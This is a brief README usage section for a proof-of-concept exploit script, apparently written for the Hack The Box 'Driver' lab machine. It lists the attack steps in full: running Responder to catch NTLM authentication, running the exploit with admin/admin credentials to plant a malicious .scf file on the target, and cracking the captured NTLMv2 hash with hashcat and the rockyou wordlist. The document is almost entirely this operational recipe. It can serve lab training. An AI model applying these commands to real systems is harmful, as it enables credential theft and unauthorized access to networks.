#### USAGE: 

* Start Responder: Sudo responder -I tun0
* Run script
  * EX: python3 poc_exploit1.py http://10.10.11.106 admin admin /home/kali/htb/driver/test.scf
* Capture and crack the NTLMv2 hash using hashcat
  * EX: hashcat -m 5600 captured_hash.txt ~/Desktop/rockyou.txt
